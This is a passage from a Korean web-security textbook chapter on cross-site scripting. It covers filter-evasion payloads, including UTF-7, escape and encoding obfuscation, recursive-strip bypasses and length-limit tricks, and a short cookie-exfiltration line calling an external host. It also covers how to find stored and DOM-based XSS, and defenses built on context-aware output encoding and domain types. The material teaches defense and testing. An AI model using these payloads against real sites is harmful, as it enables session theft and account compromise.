**문자셋(charset)을 이용한 우회.** 응답을 비표준 인코딩으로 해석하게 만들면 많은 필터가 무력화된다. `<script>alert(document.cookie)</script>`를 UTF-7로 표현하면:

```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```

이 문자열은 흔한 XSS 필터를 통과한다. 관건은 브라우저가 응답을 원하는 문자셋으로 해석하게 만드는 것이다. Content-Type 헤더나 그에 대응하는 HTML 메타 태그를 제어할 수 있거나, 요청에 `charset` 파라미터를 넣을 수 있으면 가능하다. 다중 바이트 문자셋(Shift-JIS, EUC-JP, BIG5)에서는 특정 바이트(예: Shift-JIS의 `0xF0`)가 2바이트 문자의 선행 바이트로 해석되어 그 뒤의 따옴표를 삼켜, 속성 구분을 깨는 방식으로 필터를 우회할 수 있다.

### 32.5.4 스크립트 코드를 난독화하기

스크립트 컨텍스트에는 진입했지만, 필터가 특정 자바스크립트 키워드나 따옴표·괄호·점 같은 문자를 막는 경우가 있다. 코드 자체를 난독화한다.

**자바스크립트 이스케이프.** 키워드 안의 문자를 이스케이프로 대체한다:

```html
<script>alert(1);</script>
```

`eval`을 쓸 수 있으면 문자열 안에서 유니코드·16진·8진 이스케이프를 모두 활용할 수 있고, 잉여 이스케이프 문자는 무시된다:

```html
<script>eval('alert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
<script>eval('a\l\ert\(1\)');</script>
```

**문자열 동적 구성.** 키워드가 리터럴로 나타나지 않게 문자열을 조립한다:

```html
<script>eval('al'+'ert(1)');</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob('YWxlcnQoMSk='));</script>
```

**eval의 대안, 점의 대안.** `eval` 직접 호출이 막히면 다른 실행 경로를 쓴다. 점(`.`)이 막히면 다른 역참조 방식을 쓴다:

```html
<script>'alert(1)'.replace(/.+/,eval)</script>
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

**기법의 결합, 그리고 HTML 인코딩과의 조합.** 자바스크립트가 HTML 태그 속성 안(이벤트 핸들러, 의사 프로토콜, 동적 스타일)에서 쓰이면, 브라우저가 자바스크립트를 해석하기 **전에** 속성 값을 HTML 디코딩한다는 점을 이용해 이 기법들을 HTML 인코딩과 결합한다:

```html
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

여기서는 자바스크립트 키워드도, 따옴표·점·괄호도 리터럴로 쓰이지 않는다.

**VBScript.** IE에서는 VBScript를 쓸 수 있다. 문법이 달라 자바스크립트만 염두에 둔 필터를 우회하며, **대소문자를 구분하지 않으므로** 입력을 대문자로 변환하는 애플리케이션에서도 동작한다(자바스크립트는 대문자로 바뀌면 실행되지 않는다):

```html
<script language=vbs>MsgBox 1</script>
<img onerror="vbs:MsgBox 1" src=a>
<IMG ONERROR="VBS:MSGBOX 1" SRC=A>
```

괄호 없이 함수를 호출할 수 있어 "코드는 괄호를 쓴다"는 가정도 깬다.

### 32.5.5 정제(sanitization) 필터 이기기

가장 흔한 방어는 시그니처 차단이 아니라 **정제**다. 핵심 문자를 HTML 인코딩하거나(`<`→`&lt;`), 특정 표현을 제거한다. 정제 필터에는 전형적인 실수가 있다.

**재귀·1회성 제거의 허점.** `<script>`를 제거하는 필터가 **한 번만** 제거한다면, 감싼 형태로 우회한다:

```
<script><script>alert(1)</script>
```

제거가 **재귀적이지 않다면**, 안쪽에서 다시 조립되게 한다:

```
<scr<script>ipt>alert(1)</script>
```

이것이 지침에서 특히 강조된 **필터 재귀 제거 우회**다. 필터가 `<script>`를 찾아 지우면, 지운 자리의 양쪽이 붙어 다시 `<script>`가 된다. 필터가 여러 단계를 순서대로 수행한다면 그 상호작용도 악용한다. `<script>`를 재귀 제거한 뒤 `<object>`를 재귀 제거한다면:

```
<scr<object>ipt>alert(1)</script>
```

**백슬래시 이스케이프의 허점.** 자바스크립트 문자열에 주입할 때, 필터가 따옴표 앞에 백슬래시를 붙여 이스케이프한다면, **백슬래시 자체가 이스케이프되는지** 확인한다. 안 된다면 우회가 가능하다. `var a = 'foo';`의 `foo`를 제어할 때:

```
foo\'; alert(1);//
```

를 주입하면 응답은 `var a = 'foo\\'; alert(1);//';`가 되어 스크립트가 실행된다.

**원래 스크립트를 버리기.** 백슬래시가 제대로 이스케이프되지만 꺾쇠는 정제되지 않는다면, 원래 스크립트를 버리고 새 스크립트를 주입한다:

```
</script><script>alert(1)</script>
```

브라우저의 HTML 태그 파싱이 내장 자바스크립트 파싱보다 우선하므로, 원래 스크립트에 문법 오류가 생겨도 주입한 스크립트는 실행된다.

**이벤트 핸들러의 HTML 디코드.** 정제 대상이 이벤트 핸들러 안이라면, 따옴표를 HTML 인코딩해 우회한다. `onclick="var a = 'foo'; ..."`의 `foo`에서, 따옴표와 백슬래시가 모두 이스케이프되어도:

```
foo&apos;; alert(1);//
```

일부 브라우저가 이벤트 핸들러를 자바스크립트로 실행하기 전에 HTML 디코드하므로 공격이 성공한다. 이 사실은 **"XSS를 막으려면 입력을 HTML 인코딩하라"는 표준 권고에 중대한 단서**를 단다. 이 컨텍스트에서 HTML 인코딩은 공격의 장애물이 아닐뿐더러, 공격자가 다른 방어를 우회하는 데 스스로 활용할 수 있다. 이 관찰이 32.10의 출발점이 된다.

### 32.5.6 길이 제한 이기기

입력이 고정 길이로 잘리면 세 가지 방법이 있다.

**첫째, 페이로드를 줄인다.** 가장 짧은 API를 쓴다. 스크립트에 주입한다면 `open("//a/"+document.cookie)`(28바이트), HTML에 주입한다면 `<script src=http://a></script>`(외부 스크립트 로드)를 쓴다.

**둘째, 여러 필드에 페이로드를 나눠 싣는다.** 같은 페이지에 사용자 입력이 여러 위치로 삽입된다면, 자바스크립트 주석(`/* */`)으로 그 사이의 HTML을 무력화하며 스크립트를 한 페이지에 걸쳐 조립한다. 세 개의 히든 필드가 있을 때:

```
page_id="><script>/*   &seed=*/alert(document.cookie);/*   &mode=*/</script>
```

를 주입하면 사이의 코드가 모두 주석이 되어, 스크립트가 한 위치에 통째로 삽입된 것과 같아진다. 이 기법은 필드마다 다른 검증이 걸린 경우에도 통한다 — 긴 필드에 `" < >`가 막혀 있어도, 짧은 필드에서 스크립트 컨텍스트를 만들면 긴 필드에는 그 문자들 없이 임의 길이의 코드를 넣을 수 있다.

**셋째, 반사형을 DOM 기반으로 "변환"한다.** 길이 제한이 있는 파라미터에 45바이트짜리 스크립트를 주입해, 길이 제한이 없는 URL 프래그먼트의 코드를 평가하게 한다:

```
<script>eval(location.hash.slice(1))</script>
```

프래그먼트는 애플리케이션 필터의 통제 밖이고 임의로 길 수 있다. 이것은 반사형과 DOM 기반의 경계가 익스플로잇 단계에서 무너질 수 있음을 보여 준다.

### 32.5.7 실전 전달의 난관

작동하는 익스플로잇을 실제 사용자에게 전달할 때 추가 난관이 있다.

- **다른 페이지로 확장.** 취약점이 흥미롭지 않은 영역(예: 비인증 영역)에 있어도, 브라우저 창 전체를 덮는 iframe을 만들고 현재 페이지를 그 안에 다시 로드하는 페이로드로 사용자를 같은 도메인 어디서나 추적·침해할 수 있다. **비인증 영역의 반사형 XSS가 인증 영역의 것보다 오히려 더 위험할 수 있다** — 잠재 피해자의 범위가 더 넓기 때문이다.
- **요청 메서드 변경.** POST로만 트리거되는 XSS도, 애플리케이션이 GET으로도 같은 요청을 처리하는지 확인한다. 많은 애플리케이션이 두 형태를 모두 관용한다. 반대로 GET을 POST로 바꿔 쿼리 문자열만 필터링하는 방어를 우회할 수도 있다.
- **쿠키·Referer 경유.** 진입점이 쿠키나 Referer 헤더인 XSS도, 같은 이름의 파라미터를 쓰거나 CSRF로 쿠키를 설정하거나, 리다이렉터를 경유해 익스플로잇할 수 있다.
- **비표준 콘텐츠(XML/JSON) 경유.** Ajax 요청이 XML·JSON을 주고받을 때도 XSS 유사 동작이 나타날 수 있다. `enctype="text/plain"` 폼으로 임의의 본문을 크로스 도메인 전송하고, XML 네임스페이스를 XHTML로 매핑해 응답이 HTML로 파싱되게 만들면 익스플로잇이 가능하다. 이 경로는 **34장**의 크로스 도메인 상호작용과 맞닿는다.
- **브라우저 XSS 필터.** 일부 브라우저는 반사형 XSS를 자체 차단한다. 그러나 이런 필터는 파라미터 값만 보고 이름은 보지 않으며, 각 파라미터를 따로 검사하므로 여러 파라미터에 페이로드를 분산하면 우회되고, 크로스 도메인 요청만 대상으로 하므로 온사이트 요청은 통과한다. XSS 조건은 **널리 쓰이는 어느 브라우저에서든** 익스플로잇 가능하면 취약점으로 간주해야 하며, 일부 브라우저의 필터 존재가 수정 필요성을 없애지 않는다.

> **이 절이 뒷받침하는 것**
>
> - 이중 디코딩·유니코드 번역을 통한 태그 괄호 우회 → **7.7** (정규화와 다중 인코딩), **7.6** (인코딩 스킴 총정리)
> - `javascript:`/`data:` 의사 프로토콜 → **7.5** (스킴의 바다)
> - NULL 바이트가 WAF의 네이티브 문자열을 종료시킴 → **12.11** (WAF의 역할과 한계)
> - 이벤트 핸들러의 HTML 디코드가 "입력을 HTML 인코딩하라"는 권고를 무너뜨림 → **32.10** (출력 컨텍스트별 인코딩)

## 32.6 저장형 XSS 찾기와 익스플로잇

저장형 XSS를 찾는 과정은 반사형과 상당 부분 겹치지만 중요한 차이가 있다. 스크립트가 저장되었다가 **다른 위치·다른 시점**에 표시되기 때문이다.

1. **고유 문자열을 모든 진입점에 제출한 뒤, 애플리케이션의 모든 콘텐츠와 기능을 다시 훑어 그 문자열이 표시되는 모든 위치를 찾는다.** 한 위치(예: 개인정보의 이름 필드)에 입력한 데이터가 여러 곳(홈, 사용자 목록, 작업 항목, 다른 사용자의 연락처, 메시지, 애플리케이션 로그)에 표시될 수 있다. 각 표시 위치는 서로 다른 보호 필터를 거치므로 개별 취약점으로 조사해야 한다.
2. **관리자만 접근하는 영역을 반드시 검토한다.** 관리자가 브라우저로 로그 파일을 열람하는 기능은 극히 흔하게 XSS에 취약하다. 공격자는 악성 HTML을 담은 로그 항목을 생성해 이를 익스플로잇한다.
3. **여러 단계를 거쳐야 저장되는 기능을 끝까지 따라간다.** 회원 가입, 주문, 자금 이체 등은 정의된 순서로 여러 요청을 제출해야 데이터가 실제로 저장된다. 각 테스트 케이스를 완료까지 밀고 가야 한다.
4. **아웃오브밴드 채널을 조사한다.** 반사형에서는 요청의 모든 파라미터·헤더에 관심을 두지만, 저장형에서는 애플리케이션이 통제 가능한 입력을 받는 모든 out-of-band 채널도 벡터다.
5. **파일 업로드·다운로드를 반드시 시험한다.** 사용자가 업로드한 파일을 다른 사용자가 내려받아 열람할 수 있으면 저장형 XSS의 흔한 원천이다.

각 파라미터에 **서로 다른** 테스트 문자열(예: 필드 이름을 붙인 고유 문자열)을 제출하면, 어느 파라미터가 어느 표시 위치의 원인인지 구분할 수 있다.

**웹메일과 파일 업로드.** 웹메일은 제3자 HTML을 그대로 페이지에 복사하므로 구조적으로 취약하다. `sendmail`로 원시 메일을 직접 구성해 다양한 필터 우회 문법과 `Content-Type`·`charset`을 시험한다. 파일 업로드에서는 먼저 스크립트를 담은 HTML 파일을 올려 본다. 차단되면 `.txt`·`.jpg` 확장자를 시도한다. 애플리케이션이 다운로드 시 `Content-Type: image/jpeg`를 지정해도, **일부 브라우저는 파일 내용이 실제로 HTML이면 그것을 HTML로 처리한다.** 이것이 10.7절이 다룬 **MIME 스니핑**이 XSS로 이어지는 경로다. 더 나아가 **하이브리드 파일**(예: GIF와 JAR을 동시에 만족하는 GIFAR)은 파일 내용을 검증하는 방어조차 우회한다. GIF 메타데이터는 파일 앞에, JAR 메타데이터는 파일 뒤에 있어 하나의 파일이 두 형식 모두의 유효한 인스턴스가 되기 때문이다.

**블라인드(blind) XSS.** 저장형의 하위 범주로, 페이로드가 즉시 렌더링되었다는 어떤 신호도 받지 못하는 경우다. 접근 수준이 다른 누군가(예: 나중에 피드백 폼을 여는 관리자)가 열람할 때에야 발화한다. 발화 시 중앙 서버로 프로브를 보내는 고유 페이로드를 쓰면 이런 숨은 취약점도 포착할 수 있다.

저장형 XSS가 흔한 근본 이유는 반사형과 같다. **데이터와 구분자가 같은 채널(HTML 응답)을 공유하고, 저장이라는 지연이 데이터를 원래 컨텍스트에서 분리해 다른 컨텍스트로 옮기기 때문이다**(→ 27.1). 저장은 인젝션의 본질을 없애지 않고, 시간과 사용자를 사이에 끼워 넣어 추적을 더 어렵게 만들 뿐이다.

## 32.7 DOM 기반 XSS 찾기와 익스플로잇

DOM 기반 XSS는 고유 문자열을 제출하고 응답에서 그 문자열을 찾는 방식으로는 발견되지 않는다. **페이로드가 서버 응답에 나타나지 않고 브라우저 DOM에 머물다가 클라이언트 스크립트가 그것을 읽기 때문이다.** 반사형·저장형이 서버 측 코드의 결함에서 비롯되는 반면, DOM 기반 XSS는 클라이언트를 마주하는 프런트엔드 코드의 결함에서 비롯된다.

이 취약점의 구조는 **소스(source)와 싱크(sink)** 라는 두 개념으로 이해된다. **소스**는 공격자가 통제할 수 있는 데이터가 들어오는 DOM 속성이다. **싱크**는 그 데이터가 코드로 해석될 수 있는 위험한 API다. 취약점은 소스에서 싱크로 흐르는 경로에 있다.

**주요 소스 (공격자가 URL로 통제 가능):**

```
document.location   document.URL   document.URLUnencoded
document.referrer   window.location
```

**주요 싱크 (동적 코드 실행·HTML 삽입):**

```
document.write()   document.writeln()   element.innerHTML
eval()   window.execScript()   setInterval()   setTimeout()
```

탐지의 기본 방법은 브라우저로 애플리케이션을 순회하며 각 URL 파라미터를 표준 테스트 문자열로 바꿔 보는 것이다:

```
"><script>alert(1)</script>
";alert(1)//
'-alert(1)-'
```

각 페이지를 실제로 렌더링하면 클라이언트 스크립트가 수정된 URL을 참조하며 실행되고, 쿠키를 담은 대화상자가 뜨면 취약점이다. 그러나 이 방법은 삽입 지점의 앞뒤 문법에 맞는 정확한 구문을 요구하므로 많은 취약점을 놓친다. **더 효과적인 방법은 모든 클라이언트 자바스크립트를 검토해 위 소스·싱크의 사용을 직접 추적하는 것이다.** 정적 HTML 페이지의 스크립트도 포함해야 한다 — DOM 기반 버그는 파라미터가 서버로 제출되는지와 무관하게 클라이언트 스크립트가 쓰이는 어디에든 존재할 수 있다.

**서버 필터를 우회하는 DOM 고유 기법.** 서버가 DOM 기반 XSS를 막으려 URL을 검증하더라도, 클라이언트 스크립트가 쿼리 문자열을 제대로 파싱하지 않고 "파라미터 이름 뒤 등호부터 URL 끝까지"를 추출하는 관행을 악용할 수 있다.

- 검증이 파라미터별로 적용되면, 취약한 파라미터 뒤에 지어낸 파라미터를 붙여 페이로드를 그 안에 둔다. 서버는 지어낸 파라미터를 무시하지만 클라이언트 스크립트는 그것까지 포함해 추출한다.
- 검증이 URL 전체에 적용되어도, 페이로드를 프래그먼트(`#`) 오른쪽에 두면 **브라우저가 프래그먼트를 서버로 전송하지 않으므로** 어떤 서버 측 필터도 그것을 차단할 수 없다.

```
https://books.example.com/error?message=오류#<script>alert(1)</script>
```

프래그먼트가 서버에 도달하지 않는다는 이 사실이 DOM 기반 XSS를 서버 방어로부터 근본적으로 분리한다. 여기서 5.9절이 다룬 **브라우저의 응답 처리**가 왜 별도의 신뢰 경계인지가 분명해진다. 서버가 응답을 보낸 뒤에도 브라우저 안에서 스크립트가 DOM을 읽고 페이지를 갱신하며, 이 과정 전체가 서버의 가시성 밖에 있다(→ 5.9). 그리고 이 스크립트가 접근하는 쿠키·데이터의 범위는 동일 출처 판정으로 결정된다(→ 5.10).

> **이 절이 뒷받침하는 것**
>
> - DOM 기반 XSS가 서버를 거치지 않고 브라우저 안에서 완결됨 → **5.9** (브라우저의 응답 처리 — 파싱, 렌더링, 서브리소스 요청)
> - 스크립트가 접근하는 데이터의 출처 범위 → **5.10** (동일 출처 판정)

## 32.8 XSS 방어 (1) — 반사형·저장형: 입력 검증, 출력 인코딩, 위험 삽입 지점 제거

XSS의 다양한 발현에도 불구하고, 취약점을 막는 것은 개념적으로 단순하다. 어려운 것은 **사용자 통제 데이터가 위험하게 다뤄지는 모든 경우를 식별하는 일**이다. 한 페이지가 수십 개의 사용자 데이터를 처리·표시할 수 있고, 핵심 기능뿐 아니라 오류 메시지 같은 곳에서도 취약점이 생긴다.

반사형·저장형 XSS의 근본 원인은 하나다. **사용자 통제 데이터가 충분한 검증·정제 없이 응답에 복사되고, 그 데이터가 HTML의 원본 소스에 삽입되므로 페이지의 내용뿐 아니라 구조까지 바꿀 수 있다.** 이를 없애려면 먼저 소스 코드를 면밀히 검토해 사용자 통제 데이터가 응답에 복사되는 모든 지점을 식별해야 한다. 즉시 요청에서 온 데이터뿐 아니라, 과거에 어떤 사용자가 out-of-band 채널로 넣은 저장 데이터까지 포함한다. 그다음 세 가지 방어를 함께 적용한다.

**입력 검증.** 데이터를 받는 지점에서 컨텍스트 의존적 검증을 가능한 한 엄격하게 수행한다. 길이가 지나치게 길지 않은지, 허용된 문자 집합만 포함하는지, 특정 정규식에 맞는지 확인한다. 이름·이메일·계좌번호 등 필드 유형에 따라 규칙을 최대한 제한적으로 적용한다.

**출력 인코딩.** 데이터를 응답에 복사하는 지점에서 HTML 인코딩해 악성 문자를 무해화한다. HTML 인코딩은 리터럴 문자를 대응하는 HTML 엔티티로 바꿔, 브라우저가 그것을 문서의 구조가 아니라 내용의 일부로 다루게 한다. 주요 문자의 인코딩은 다음과 같다.

**표 32-2. 주요 문자의 HTML 엔티티**

| 문자 | HTML 엔티티 |
|---|---|
| `"` | `&quot;` |
| `'` | `&apos;` |
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |

흔한 실수는 **특정 컨텍스트에서 당장 위험해 보이는 문자만** 인코딩하는 것이다. 큰따옴표 문자열에 삽입한다고 `"`만, 태그에 삽입한다고 `>`만 인코딩하면 우회 위험이 커진다. 앞에서 보았듯 공격자는 브라우저의 관용을 이용해 컨텍스트를 바꾸거나 예상 밖으로 코드를 주입하고, 여러 필드에 공격을 분산한다. **훨씬 견고한 접근은 삽입 위치와 무관하게, 공격자에게 유용할 수 있는 모든 문자를 항상 인코딩하는 것이다.** 최고 수준의 보증을 위해 개발자는 공백을 포함한 모든 비영숫자 문자를 인코딩하기도 한다. 이 방식은 대개 측정 가능한 오버헤드를 주지 않으면서 필터 우회에 심각한 장애물이 된다.

입력 검증과 출력 인코딩을 **함께** 쓰는 이유는 두 겹의 방어를 두어, 하나가 실패해도 다른 하나가 보호하기 위함이다. 둘 중 **출력 인코딩이 더 중요하며 필수**다. 입력 검증은 보조적 안전망으로 본다. 단, 필터링과 인코딩은 반드시 관련 정규화가 끝난 뒤 수행하고 그 뒤에 다시 정규화하지 않아야 하며, NULL 바이트가 검증을 방해하지 않게 해야 한다.

**위험 삽입 지점 제거.** 어떤 위치는 사용자 입력을 삽입하기에 본질적으로 너무 위험하므로, 다른 구현 방법을 찾아야 한다. **기존 스크립트 코드 안에** 사용자 데이터를 직접 삽입하는 것은 가능한 한 피한다. `<script>` 태그 안이든 이벤트 핸들러 안이든 마찬가지다. 이 컨텍스트에서 공격자가 데이터의 문맥을 장악하면 최소한의 작업으로 임의 명령을 주입할 수 있다. **URL을 값으로 받는 속성**에도 사용자 입력 삽입을 피한다 — 의사 프로토콜 등 여러 기법이 있기 때문이다. 또한 공격자가 **응답의 문자셋을 조작**할 수 없게, 응답 헤더에 인코딩을 명시하고 그것을 바꾸는 어떤 수단도 허용하지 않아야 한다:

```
Content-Type: text/html; charset=ISO-8859-1
```

**제한된 HTML 허용하기.** 블로그 댓글이나 도서 리뷰처럼 사용자가 HTML 형식으로 서식을 넣어야 하는 경우, 위 조치를 그대로 적용하면 마크업이 화면에 그대로 보여 기능이 깨진다. 이때는 **화이트리스트 방식으로 특정 태그·속성만 허용**해야 한다. 이는 결코 사소하지 않은 작업이다. 겉보기에 안전한 `<b>`, `<i>`, `<a href>`조차 다음처럼 악용될 수 있기 때문이다.

```html
<b style=behavior:url(#default#time2) onbegin=alert(1)>
<i onclick=alert(1)>클릭</i>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">클릭</a>
```

성숙한 검증 프레임워크를 쓰거나, 사용자에게 제한된 중간 마크업 언어를 제공하고 애플리케이션이 그것을 HTML로 변환하는 방식이 안전하다.

이 세 방어를 32.8의 결론으로 두기 전에, 한 걸음 물러설 필요가 있다. 위 권고에는 이미 균열이 보인다. "모든 문제 문자를 HTML 인코딩하라"고 했지만, 32.5.5에서 이벤트 핸들러 컨텍스트에서는 HTML 인코딩이 오히려 공격을 돕는다는 것을 보았다. 이 균열이 우연이 아님을, 그리고 그것이 방어의 발상 자체에 있는 결함임을 32.10에서 밝힌다.

## 32.9 XSS 방어 (2) — DOM 기반

앞의 방어는 DOM 기반 XSS에 직접 적용되지 않는다. 취약점이 사용자 데이터가 서버 응답에 복사되는 것과 무관하기 때문이다. 근본 방어는 하나다. **가능한 한 클라이언트 스크립트로 DOM 데이터를 처리해 페이지에 삽입하는 것을 피한다.** 처리되는 데이터가 서버의 직접 통제 밖, 때로는 가시성 밖에 있으므로 이 동작은 본질적으로 위험하다.

불가피하다면, 반사형과 대응하는 두 방어를 클라이언트 측에서 적용한다.

**입력 검증.** 이 영역은 클라이언트 측 검증이 서버 측보다 더 효과적일 수 있는 드문 경우다. 문서에 삽입하기 전, 데이터가 영숫자와 공백만 포함하는지 검증한다:

```html
<script>
  var a = document.URL;
  a = a.substring(a.indexOf("message=") + 8, a.length);
  a = unescape(a);
  var regex = /^([A-Za-z0-9+\s])*$/;
  if (regex.test(a)) document.write(a);
</script>
```

심층 방어로 서버 측 URL 검증도 병행한다 — 쿼리 문자열이 단일 파라미터인지, 이름이 정확히 `message`인지(대소문자 구분), 값이 영숫자만인지 확인한다. 단, 이때에도 클라이언트 스크립트는 프래그먼트가 포함되지 않도록 값을 제대로 파싱해야 한다.

**출력 인코딩.** 반사형처럼, DOM 데이터를 문서에 삽입하기 전 클라이언트 자바스크립트로 HTML 인코딩한다. 브라우저의 텍스트 노드 생성을 이용하면 안전하게 인코딩된 문자열을 얻는다:

```javascript
function sanitize(str) {
  var d = document.createElement('div');
  d.appendChild(document.createTextNode(str));
  return d.innerHTML;
}
```

여기서도 원리는 같다. **위험한 싱크(`innerHTML`, `eval`, `document.write`)로 흐르는 데이터를 그 싱크가 코드로 해석하지 못하는 형태로 바꾸거나, 애초에 그런 싱크를 쓰지 않는 것.** 소스에서 싱크로 가는 경로를 끊는 일이다.

> **이 책의 범위를 넘어서**
>
> 이 장은 5권의 원서가 다루는 시점의 방어를 서술한다. 오늘날 XSS 방어는 여러 현대적 계층을 더한다. 응답 헤더로 스크립트의 출처와 실행을 제한하는 콘텐츠 보안 정책(Content Security Policy), 위험한 싱크에 원시 문자열이 도달하는 것을 타입 수준에서 막는 Trusted Types, 사용자 HTML을 견고하게 정제하는 DOMPurify 같은 라이브러리, 그리고 브라우저 내장 반사형 XSS 필터의 폐기(주요 브라우저는 이 필터가 오히려 새로운 취약점을 만든다는 이유로 제거했다)가 그것이다. 이들은 각각 별도의 논의를 요하며 이 책의 범위 밖이다. 다만 이 장이 세운 원리 — 컨텍스트에 맞는 출력 인코딩, 위험 싱크 회피, 화이트리스트 — 는 이 현대적 계층들의 밑에 그대로 남아 있다.

## 32.10 출력 컨텍스트별 인코딩과 도메인 타입의 역할

이 절은 이 책의 고유한 기여다. 32.8이 남긴 균열에서 출발한다. "모든 문제 문자를 HTML 인코딩하라"는 권고는 왜 이벤트 핸들러 컨텍스트에서 무너졌는가? 답은 단순하지만 결과는 넓다. **인코딩 규칙은 문자에 달린 것이 아니라 출력 컨텍스트에 달려 있다.**

### 32.10.1 출력 컨텍스트마다 이스케이프 규칙이 다르다

같은 문자열 `"><script>`가 어떤 컨텍스트에 삽입되는가에 따라, 무엇이 위험하고 무엇을 어떻게 인코딩해야 하는지가 완전히 달라진다.

**표 32-3. 출력 컨텍스트별 이스케이프 규칙**

| 출력 컨텍스트 | 예시 위치 | 데이터를 코드로 만드는 문자 | 필요한 인코딩 |
|---|---|---|---|
| HTML 본문 | `<div>여기</div>` | `< > &` | HTML 엔티티 인코딩 |
| 태그 속성 값(따옴표 있음) | `<input value="여기">` | `" ' &` 및 컨텍스트 문자 | HTML 엔티티 인코딩, 속성은 반드시 따옴표로 감쌈 |
| 태그 속성 값(따옴표 없음) | `<input value=여기>` | 공백·`" ' \` `` ` `` `= < >` 등 다수 | 위험. 따옴표 없는 속성은 금지 |
| 스크립트 문자열 | `<script>var a='여기'</script>` | `' " \ </` 개행 | 자바스크립트 문자열 이스케이프(`\xHH`) |
| 스타일(CSS) | `<div style="여기">` | `` `expression`, `url()`, `;` `` | CSS 이스케이프, 또는 삽입 금지 |
| URL 속성 | `<a href="여기">` | `javascript:` `data:` 스킴, `%` 등 | URL 인코딩 + 스킴 화이트리스트 |

이 표가 말하는 것은 명확하다. HTML 본문에 안전한 인코딩이 스크립트 문자열에서는 무의미하고, 스크립트 문자열에 맞는 이스케이프가 URL 속성에서는 `javascript:` 스킴을 막지 못한다. 이벤트 핸들러(HTML 속성 안의 자바스크립트)처럼 **컨텍스트가 중첩된** 경우에는, 브라우저가 HTML 디코드를 먼저 하고 그 결과를 자바스크립트로 해석하므로 두 규칙을 순서대로 적용해야 한다. 32.5.5의 우회가 성공한 이유가 바로 이것이다 — 방어자는 HTML 컨텍스트의 규칙 하나만 적용했지만, 브라우저는 두 개의 컨텍스트를 순서대로 통과시켰다.

### 32.10.2 "입력을 이스케이프한다"는 발상 자체가 틀렸다

여기서 결정적 전환이 온다. XSS 방어를 "입력을 받을 때 위험한 문자를 이스케이프한다"로 이해하는 순간, 이미 진 것이다. **입력 시점에는 그 데이터가 나중에 어느 컨텍스트로 출력될지 알 수 없기 때문이다.**

같은 이름 `O'Brien`을 생각해 보자. 이 값은 HTML 본문에도, 툴팁 속성에도, 자바스크립트 인사말 문자열에도, 프로필 URL에도 출력될 수 있다. 입력 시점에 `'`를 `&apos;`로 이스케이프해 저장하면, HTML 속성에서는 맞지만 자바스크립트 문자열에서는 깨지고, 데이터베이스에는 사람 이름이 아닌 것이 저장되며, 이메일 발송처럼 HTML이 아닌 출력에서는 `&apos;`가 그대로 새어 나온다. 입력 시점의 이스케이프는 **컨텍스트를 알기도 전에 컨텍스트를 가정한다.** 그 가정은 대부분 틀린다.

올바른 원리는 이렇다. **이스케이프는 입력 시점이 아니라 출력 시점에, 그 출력 컨텍스트에 맞춰 수행해야 한다.** 데이터는 원래의 순수한 형태로 저장되고, HTML 본문으로 나갈 때 HTML 인코딩되고, 자바스크립트 문자열로 나갈 때 자바스크립트 이스케이프되고, URL로 나갈 때 URL 인코딩된다. 같은 값이 세 곳으로 나가면 세 번, 각기 다르게 인코딩된다. 이것이 32.8에서 "출력 인코딩이 필수이고 더 중요하다"고 한 말의 진짜 의미다. 방어의 무게중심은 입력이 아니라 출력에 있다.

### 32.10.3 도메인 타입 관점 — 타입이 컨텍스트를 기억한다

그러나 출력 인코딩만으로는 부족한 지점이 있다. 개발자가 **어느 것이 인코딩되어야 하는 사용자 데이터이고 어느 것이 이미 안전한 마크업인지**를 매 출력 지점에서 정확히 기억해야 하기 때문이다. 한 페이지가 수십 개의 값을 출력하고, 그중 하나만 인코딩을 빠뜨려도 취약점이 생긴다. 문제의 뿌리는 더 깊다. **문자열을 문자열로 다루는 한, 문자열은 자신이 어느 컨텍스트에서 왔고 어디로 가야 하는지를 기억하지 못한다.** `String` 타입에는 "이것은 신뢰할 수 없는 사용자 이름"이라는 정보도, "이것은 이미 HTML 인코딩된 안전한 조각"이라는 정보도 담기지 않는다. 컨텍스트는 개발자의 머릿속에만 있고, 코드에는 없다.

Secure by Design이 제시하는 답은 **도메인 프리미티브(domain primitive)** 다(→ 44.1). 값 객체(value object)를 보안 관점으로 다듬어, 그 존재 자체가 유효성을 증명하는 가장 작은 구성 요소로 만든 것이다. 사용자 이름을 `String`이 아니라 `CustomerName` 타입으로 다루면, 그 타입의 생성자가 불변식 — 허용된 문자, 길이 범위 — 을 강제한다. `CustomerName`이 존재한다면 그것은 이미 유효하다. 유효하지 않으면 존재할 수 없다.

핵심은 **타입이 컨텍스트를 기억한다**는 것이다. 문자열을 문자열로 다루면 컨텍스트를 잃지만, 도메인 타입으로 다루면 타입 자체가 "이 값은 검증된 고객 이름이며, HTML로 출력될 때 이렇게 인코딩되어야 한다"는 지식을 담을 수 있다(→ 44.2). 출력 계층은 `String`을 받으면 그것이 안전한지 알 수 없어 보수적으로 모두 인코딩하거나(때로 이중 인코딩) 아무것도 안 하지만(취약), 도메인 타입을 받으면 타입이 지시하는 대로 정확히 인코딩할 수 있다. 컨텍스트가 개발자의 기억에서 타입 시스템으로 옮겨 가는 것이다. 이것이 44.3~44.4에서 도메인 프리미티브 라이브러리를 구축하고, 도메인을 공개적으로 노출하지 않는 이유로 이어진다.

### 32.10.4 설계적 뿌리 — 입력을 그대로 반향하지 말라

이 절의 발상은 새로운 것이 아니다. 30.7절 "입력을 절대 그대로 반향하지 말라"가 그 설계적 뿌리다(→ 30.7). 그곳에서 우리는, 검증 실패 메시지에 입력을 그대로 담는 관행이 어떻게 XSS와 2차 공격의 씨앗이 되는지 보았다. 온라인 서점의 이름 검증기가 `"^[a-zA-Z ]+$"`에 실패한 입력을 오류 메시지에 그대로 실으면:

```
Invalid name. Got: <script>alert("XSS")</script>
```

